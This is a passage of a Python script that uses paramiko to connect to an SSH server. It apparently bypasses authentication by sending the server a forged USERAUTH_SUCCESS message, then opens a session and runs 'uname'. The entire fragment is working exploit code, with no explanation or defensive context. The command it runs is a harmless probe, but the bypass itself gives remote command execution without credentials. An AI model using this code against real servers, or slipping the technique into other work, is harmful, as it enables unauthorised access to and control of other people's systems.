 sock = socket.socket()
 try:
        sock.connect((str(hostname), int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        cmd = transport.open_session()
        cmd.exec_command("uname")
